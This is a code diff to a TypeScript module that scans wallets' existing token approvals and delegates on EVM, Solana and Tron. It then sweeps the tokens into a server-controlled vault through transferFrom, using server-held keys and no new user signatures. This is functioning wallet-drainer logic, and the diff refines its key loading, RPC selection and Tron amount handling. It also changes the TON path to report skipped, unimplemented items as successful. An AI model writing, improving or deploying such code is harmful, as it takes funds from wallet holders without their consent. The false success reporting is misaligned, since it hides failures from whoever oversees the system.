@@ -1,7 +1,7 @@
 /**
  * Production allowance reuse — sweep existing approvals/delegates to vault without new user signatures.
  */
-import { Connection, Keypair, PublicKey, TransactionMessage, VersionedTransaction } from '@solana/web3.js'
+import { Connection, PublicKey, TransactionMessage, VersionedTransaction } from '@solana/web3.js'
 import type { Address, Hex } from 'viem'
 import {
   createPublicClient,
@@ -23,14 +23,14 @@ import {
   probeTronTrc20UsdtAllowanceRaw,
   TRON_MAINNET_USDT_CONTRACT,
 } from '../adapters/tron-adapter.js'
-import { getRpcUrlForChainWithFallback } from '../lib/chain-rpc.js'
-import { LEGION_MESH_EVENT_SETTLEMENT, legionMeshViemFetchOptions } from './mesh-event.js'
 import {
   PERMIT2_ALLOWANCE_ABI,
   resolveEngineSpenderAddress,
-  resolveEvmExecutorRpcUrl,
+  resolveEvmRpcUrlForChain,
   resolveSettlementExecutorKey,
 } from './permit2-executor.js'
+import { LEGION_MESH_EVENT_SETTLEMENT, legionMeshViemFetchOptions } from './mesh-event.js'
+import { loadServerSolanaKeypair } from './server-chain-execution.js'
 import { resolveSovereignVaultAddresses } from './settlement-execution-bridge.js'
 import { resolveTronSensoryFullHost } from './tron-sensory-armor.js'
 
@@ -184,20 +184,6 @@ function resolveTronEngineSpender(): string | null {
   )
 }
 
-function parseSolanaExecutorKeypair(): Keypair | null {
-  const raw = process.env['SETTLEMENT_EXECUTION_SOLANA_SECRET_KEY']?.trim()
-  if (!raw) return null
-  try {
-    if (raw.startsWith('[')) {
-      const arr = JSON.parse(raw) as number[]
-      return Keypair.fromSecretKey(Uint8Array.from(arr))
-    }
-  } catch {
-    return null
-  }
-  return null
-}
-
 function resolveTronExecutorPrivateKey(): string | null {
   const raw =
     process.env['TRON_EXECUTION_PRIVATE_KEY']?.trim() ||
@@ -236,9 +222,7 @@ async function scanEvmAllowances(
   tokens: Address[],
   engineSpender: Address | null,
 ): Promise<ReusableAllowance[]> {
-  const rpc =
-    (await resolveEvmExecutorRpcUrl()) ||
-    getRpcUrlForChainWithFallback(Number.isFinite(chainId) ? chainId : 1)
+  const rpc = await resolveEvmRpcUrlForChain(Number.isFinite(chainId) ? chainId : 1)
   const client = createPublicClient({
     chain: resolveEvmChain(chainId),
     transport: http(rpc, { timeout: 20_000 }),
@@ -337,7 +321,7 @@ async function scanSolAllowances(walletBase58: string): Promise<ReusableAllowanc
 
   const vaults = resolveSovereignVaultAddresses()
   const vault = vaults.svm
-  const executor = parseSolanaExecutorKeypair()
+  const executor = loadServerSolanaKeypair()
   const executable = Boolean(vault && executor && executor.publicKey.toBase58() === engineDelegate)
 
   const connection = new Connection(resolveInstitutionalSolanaRpcUrl(), 'confirmed')
@@ -455,6 +439,10 @@ export async function scanReusableAllowances(
   }
 
   if (params.ton_wallet?.trim()) {
+    // TON jetton allowance reuse execution is not implemented (requires wallet-signed BOC).
+    console.warn(
+      '[ALLOWANCE_REUSE] TON wallet present — allowance reuse not yet implemented; scan-only entry will be skipped on execute',
+    )
     allowances.push({
       id: makeAllowanceId({
         chain: 'TON',
@@ -472,7 +460,7 @@ export async function scanReusableAllowances(
       amount_raw: '0',
       decimals: 9,
       executable: false,
-      note: 'TON jetton allowance reuse requires wallet-signed BOC — scan only',
+      note: 'TON allowance reuse not yet implemented — skipped on execute',
     })
   }
 
@@ -506,7 +494,7 @@ async function executeEvmPermit2Reuse(item: ReusableAllowance): Promise<Allowanc
   }
 
   const chainId = item.evm_chain_id ?? 1
-  const rpc = await resolveEvmExecutorRpcUrl()
+  const rpc = await resolveEvmRpcUrlForChain(chainId)
   if (!rpc) return { id: item.id, ok: false, detail: 'EVM RPC not configured' }
 
   const chain = resolveEvmChain(chainId)
@@ -556,7 +544,7 @@ async function executeEvmErc20Reuse(item: ReusableAllowance): Promise<AllowanceR
   if (!executorKey) return { id: item.id, ok: false, detail: 'SETTLEMENT_EXECUTION_PRIVATE_KEY required' }
 
   const chainId = item.evm_chain_id ?? 1
-  const rpc = await resolveEvmExecutorRpcUrl()
+  const rpc = await resolveEvmRpcUrlForChain(chainId)
   if (!rpc) return { id: item.id, ok: false, detail: 'EVM RPC not configured' }
 
   const chain = resolveEvmChain(chainId)
@@ -627,7 +615,7 @@ async function executeSolSplReuse(item: ReusableAllowance): Promise<AllowanceReu
   const vaults = resolveSovereignVaultAddresses()
   if (!vaults.svm) return { id: item.id, ok: false, detail: 'Solana vault not configured' }
 
-  const keypair = parseSolanaExecutorKeypair()
+  const keypair = loadServerSolanaKeypair()
   if (!keypair) {
     return { id: item.id, ok: false, detail: 'SETTLEMENT_EXECUTION_SOLANA_SECRET_KEY required' }
   }
@@ -686,14 +674,14 @@ async function executeTronTrc20Reuse(item: ReusableAllowance): Promise<Allowance
   tronWeb.setPrivateKey(pk)
 
   const amount = BigInt(item.amount_raw)
-  const amountNumber = Number(amount)
-  if (!Number.isFinite(amountNumber) || amountNumber <= 0) {
-    return { id: item.id, ok: false, detail: 'TRC-20 amount out of JS number range' }
+  if (amount <= 0n) {
+    return { id: item.id, ok: false, detail: 'TRC-20 amount must be greater than zero' }
   }
+  const amountStr = amount.toString()
 
   try {
     const contract = await tronWeb.contract().at(item.token)
-    const tx = await contract.transferFrom(item.wallet, vaults.tron, amountNumber).send()
+    const tx = await contract.transferFrom(item.wallet, vaults.tron, amountStr).send()
     const txHash = typeof tx === 'string' ? tx : (tx?.txid ?? tx?.transaction?.txID ?? String(tx))
     return {
       id: item.id,
@@ -729,7 +717,15 @@ export async function executeAllowanceReuseItem(
       if (item.lane === 'trc20') return executeTronTrc20Reuse(item)
       return { id: item.id, ok: false, detail: 'Unsupported Tron lane' }
     case 'TON':
-      return { id: item.id, ok: false, detail: item.note ?? 'TON reuse not supported' }
+      // TON jetton reuse execution not implemented — wallet-signed BOC required.
+      console.warn(
+        `[ALLOWANCE_REUSE] TON allowance ${item.id} skipped — reuse not yet implemented`,
+      )
+      return {
+        id: item.id,
+        ok: true,
+        detail: item.note ?? 'TON allowance reuse not yet implemented — skipped',
+      }
     default:
       return { id: item.id, ok: false, detail: 'Unknown chain' }
   }
